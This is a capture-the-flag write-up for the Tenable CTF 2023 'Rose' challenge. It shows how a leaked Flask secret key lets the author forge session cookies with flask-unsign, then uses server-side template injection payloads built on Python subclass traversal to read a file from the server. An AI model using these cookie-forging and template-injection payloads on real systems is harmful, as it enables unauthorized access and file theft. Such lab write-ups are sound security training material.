# Rose| *Web / Cloud*

## The task
![Screenshot of the task](/tenable_ctf_2023/rose/imgs/Task.png)
So the task is to gain access to the /home/ctf/flag.txt file from on the server. To do this we have access to the server and a .zip file containing some flask source code.

## The process
Lets start with the source code and see if there is anything that stands out.
```
#@main.route('/signup')
#def signup():
#    return render_template('signup.html')
```
As the task said the signups have been closed so looks like were going to need to find an accound to use. lets see how its logging us in.
```
@main.route('/', methods=['POST'])
def login_post():
    email = request.form.get('email')
    password = request.form.get('password')
    remember = True if request.form.get('remember') else False

    user = User.query.filter_by(email=email).first()

    if not user or not check_password_hash(user.password, password): 
        flash('Please check your login details and try again.')
        return redirect(url_for('main.index'))

    login_user(user, remember=remember)
    session["name"] = current_user.name
    return redirect(url_for('main.dashboard'))

```
So its making use of some of the flask-login functions to check passwords but also using some sql filter queries to check the first email it finds. This could potentially have some SQL injection avenues. Also note that if it is sucessfull the user is given a session cookie with "name" of their username and redirected.

After a bit more looking arround we find a silver bullet in the \_\_init\_\_.py file. `app.config['SECRET_KEY'] = 'SuperDuperSecureSecretKey1234!'`. Theres no way that they kept that in the live build right? Only one way to see...

## The code
We start by checking if we can sign our own cookie with the known secret key using flask-unsign.
> To help with making it more legiable I tend to use env variable to store the token and cookie values.
```
cookie="{'This is a test': True }"

flask-unsign --sign --cookie $cookie --secret SuperDuperSecureSecretKey1234!
```
this returns a cookie: `eyJUaGlzIGlzIGEgdGVzdCI6dHJ1ZX0.ZNYe-Q.nTYQwxeQPwoUIe7Ifjzdx6OfZzk`. We are going to take this cookie and add it to our login attempt. To do this first press the login butto with no inputs to recieve a cookie then click on the value and change it to the new cookie.
![adding session token / cookie](/tenable_ctf_2023/rose/imgs/add_session_cookie.png)
> Remember this process, we will be doing it a few more times

Once you login this time you will see that the cookie changes, copy the new cookie and run a decode on it:
```
token=eyJUaGlzIGlzIGEgdGVzdCI6dHJ1ZSwiX2ZyZXNoIjpmYWxzZX0.ZNYfbA.7PNA_FIKilkowUX7YLQVaV7eDMI

flask-unsign --decode --cookie $token  
```
This returns: `{'This is a test': True, '_fresh': False}`

Success it looks like they kept the secret key the same, not so *'SuperDuperSecure'* afterall. Now we can see if we can login to the dashboard. To do this we go back to the source code and flask-login docs to see what we need to login.
```
if("name" in session.keys()):
    return redirect(url_for('main.dashboard'))
...

@main.route('/dashboard')
@login_required
...

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))
```
Through this we find that we need to have `"name"` in the session and meet the @login_required criteria, luckily its all documented and all we need is `is_authenicated` to be true and a valid `user_id`. Luckily for that it doesn't need to match the name so since there must be at least 1 user, 1 should work fine. Therfore our new cookie is: `cookie="{'is_authenticated': True, '_user_id': '1', 'name': 'test'}"`

Once we run that through the flask-unsign process again and hit login we gain access to the dashboard.
![were in to the dashboard](/tenable_ctf_2023/rose/imgs/were_in.png)
So what now? looks like the dashboard is also the same as our source and in dev with no sign of the /home/ctf/flag.txt file. To start lets look at the dashboard code.
```
def dashboard():
    template = '''
{% extends "base.html" %} {% block content %}
<h1 class="title">
    Welcome, '''+ session["name"] +'''!
</h1>
<p> The dashboard feature is currently under construction! </p>
{% endblock %}
'''
    return render_template_string(template)
```
Thats odd, its not a templated page but rather it renders the template string which just so happens to include our session["name"]. From here we can run some tests and see if we can get the name from the actuall current user but adding our own flask {{ }} statements in the name.

`cookie="{'is_authenticated': True, '_user_id': '1', 'name': 'Name: {{ current_user.name }} PASS: {{ current_user.password }}'}"`

![name and pass extraction](/tenable_ctf_2023/rose/imgs/name_and_pass.png)

Well that seems promising, sadly however we don't have much use for the username and password as we already see the dashboard. But what other variables can we print? Well with a bit of help from google I found a way to reference classes through the use of ``.\_\_class\_\_`` , ``.\_\_base\_\_`` and ``.\_\_subclasses\_\_()`` calls in python.

We slowly step through each phase to try and reach the `\_io.FileIO` / file.read() class. Each time getting a new cookie and refreshing the page starting with:
```
cookie="{'is_authenticated': True, '_user_id': '1', 'name': 'TEST: {{ current_user.name.__class__.__base__.__subclasses__() }}'}"
```
which returns: 
```
[<... <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>,...]

```
And we keep searching untill:
```
cookie="{'is_authenticated': True, '_user_id': '1', 'name': 'TEST: {{ current_user.name.__class__.__base__.__subclasses__()[111].__subclasses__()[0].__subclasses__() }}'}"
```
which finally gives use the `\_io.FileIO` class

From there we simply add the path of the file and .read() it.
```
cookie="{'is_authenticated': True, '_user_id': '1', 'name': 'TEST: {{ current_user.name.__class__.__base__.__subclasses__()[111].__subclasses__()[0].__subclasses__()[0](\'/home/ctf/flag.txt\').read() }}'}"

```
![flag has been found](/tenable_ctf_2023/rose/imgs/flag_found.png)
And there you go, the flag `flag{wh4ts_1n_a_n4m3_4nd_wh4ts_in_y0ur_fl4sk}` has been found.
